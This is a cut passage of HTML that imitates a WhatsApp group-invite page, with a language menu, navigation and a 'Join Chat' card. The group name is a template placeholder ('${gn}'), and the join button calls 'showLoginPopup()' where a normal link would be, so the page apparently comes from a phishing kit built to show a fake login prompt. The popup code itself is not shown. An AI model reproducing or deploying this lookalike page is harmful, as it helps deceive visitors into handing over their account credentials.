                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                                    </select><select id="u_0_7_l0" class="_9tg0 _afo4 _afoc" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">azərbaycan</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">català</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">dansk</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">eesti</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">español</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">français</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">hrvatski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">italiano</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">latviešu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">lietuvių</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">magyar</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">norsk bokmål</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">o‘zbek</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">polski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">română</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">shqip</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">slovenčina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">slovenščina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">suomi</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">svenska</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                                    </select><svg width="12" height="8" viewBox="0 0 12 8" fill="none" class="_a99- _afob">
                                                        <path d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z"></path>
                                                    </svg></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </nav>
                        </div>
                    </div><span class="_afwd"><a data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_LogoBlack_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_afvz" alt="WhatsApp Main Page" src="https://static.whatsapp.net/rsrc.php/v4/yq/r/mdQNdcFMi0p.png" /></span></a></span><span class="_afw1"><a data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_LogoGreen_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_afvz" alt="WhatsApp Main Page" src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" /></span></a></span>
                    <nav class="_afwe">
                        <ul class="_afwg">
                            <li class="_afn_">
                                <div><button aria-controls="replace_me_subnav" aria-expanded="false" id="u_0_8_QU" class="_9vd5 _aens _afod _afoe" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Features_Desktop_Dropdown&quot;&#125;"><span class="_afog"><span class="_9vg3 _aj1b" style="">Features</span></span><svg width="8" height="13" fill="none" class="_9vd8 _agnt _afol _afok">
                                            <path d="M7.41 1.91L2.83 6.5l4.58 4.59L6 12.5l-6-6 6-6 1.41 1.41z" fill="currentColor"></path>
                                        </svg></button>
                                    <div id="replace_me_subnav" class="_ag3x" aria-hidden="true">
                                        <ul role="menu" class="_afo6" id="u_0_9_Ur">
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/privacy" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_MessagePrivately_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="16" height="21" viewBox="0 0 16 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__privacy _ag3z">
                                                            <path d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Message privately</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>End-to-end encryption and privacy controls.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/stayconnected" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_StayConnected_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__globe-alt _ag3z">
                                                            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Stay connected</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Message and call for free* around the world.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/groups" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_ConnectInGroups_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="24" height="13" viewBox="0 0 24 13" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__communities _ag3z">
                                                            <path d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Connect in groups</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Group messaging made easy.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/expressyourself" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_ExpressYourself_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__smileFace _ag3z">
                                                            <path d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Express yourself</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Say it with stickers, voice, GIFs and more.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://business.whatsapp.com/" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_WhatsAppBusiness_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__store _ag3z">
                                                            <path d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">WhatsApp business</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Reach your customers from anywhere.</p>
                                                        </div>
                                                    </span><svg class="_wauiIcon__go-to-icon _agnt _wauiNavDropdownCard__bottomIcon" width="10" height="10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                        </ul>
                                    </div>
                                </div>
                            </li>
                            <li class="_afn_"><a href="https://www.whatsapp.com/privacy" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Privacy_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Privacy</span></span></span></a></li>
                            <li class="_afn_"><a href="https://faq.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_HelpCenter_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Help Center</span></span></span></a></li>
                            <li class="_afn_"><a href="https://blog.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Blog_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Blog</span></span></span></a></li>
                            <li class="_afn_"><a href="https://business.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_ForBusiness_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">For Business</span></span></span></a></li>
                            <li class="_afn_"><a href="https://www.whatsapp.com/download" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Apps_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Apps</span></span></span></a></li>
                        </ul>
                    </nav>
                    <div class="_agga"><span class="_ag1l">
                            <div class="_asz5">
                                <div class="_9tar _9ta3 _9ta5 _9ta7"><a href="https://web.whatsapp.com/" target="https://web.whatsapp.com/" class="_aeo8 _9vcv _9u4o _9u4j _9sep" data-ms="&#123;&quot;creative&quot;:&quot;cta_button&quot;,&quot;creative_detail&quot;:&quot;DesktopNav_WhatsAppWeb_LogIn_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Log in</span><span><svg class="_abjs _agnt _9u4c" width="10" height="15" viewBox="0 0 10 18" fill="none">
                                                <path d="M0.879395 13.0463L6.41356 7.5L0.879395 1.95375L2.58314 0.25L9.83315 7.5L2.58314 14.75L0.879395 13.0463Z" fill="currentColor"></path>
                                            </svg></span></a><a href="https://www.whatsapp.com/download" target="https://www.whatsapp.com/download" class="_aeo8 _9vcv _9u4o _9u4i _9sep" aria-label="Download WhatsApp" role="button" data-ms="&#123;&quot;creative&quot;:&quot;cta_button&quot;,&quot;creative_detail&quot;:&quot;DesktopNav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                            </svg></span></a></div>
                            </div>
                        </span>
                        <div class="_asz5"><a aria-label="download whatsapp" href="https://www.whatsapp.com/download" class="_afwh _adie _adif" role="button" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;MobileNav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _adid _arcp _afbl">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                </svg></a></div>
                    </div>
                </div>
            </header>
        </div>
        <div data-testid="whatsapp_www_root" id="content-wrapper">
            <div class="_9r_7">
                <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                    <div class="_9t2e _ao8r _aoa0 _9t2c">
                        <div class="_9t2g _9t2c _a1fe">
                            <div class="_9tar _9ta4 _9ta6 _9ta8">
                                <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                    <div class="_9scd"></div>
                                    <div style="display: block;" id="main_block"><a title="Follow this link to join" id="action-icon" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_9vx6" src="https://pps.whatsapp.net/v/t61.24694-24/491877078_749226784235702_7604555501025952203_n.jpg?ccb=11-4&amp;oh=01_Q5Aa1gFFxdnabIO1bvnNPEnbyj_B3c90eHooqSl5IBREJ3Lk9g&amp;oe=684F8886&amp;_nc_sid=5e03e0&amp;_nc_cat=107" /></span></a>
                                        <h3 class="_9vd5 _9scr" style="color:#5E5E5E;">${gn}</h3>
                                        <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">WhatsApp Group Invite</h4><a onclick="showLoginPopup()" title="Follow this link to join" id="action-button" class="_9vcv _advm" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Join Chat</span></a>
                                        <hr class="_9tpv _9scb _9scr _9scb _9scr" style="background-color:#F0F4F9;" />
                                        <h4 class="_9vd5" style="color:#5E5E5E;">Don&#039;t have WhatsApp yet?</h4>
                                        <h4 class="_9vd5 _9scc"><a href="https://www.whatsapp.com/download" class="_9vcv _9vcx" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a></h4>
                                    </div>
                                    <div id="fallback_block" style="display: none;">
                                        <h3 class="_9vd5">Looks like you don&#039;t have WhatsApp installed!</h3><a href="https://www.whatsapp.com/download" class="_9vcv _advm _9scr" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>
    <div id="footer-wrapper" class="_allg">
        <div class="_adhc">
            <footer class="_9t2i" data-testid="whatsapp_www_footer">
                <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _ae_r"><span class="_ae_s">
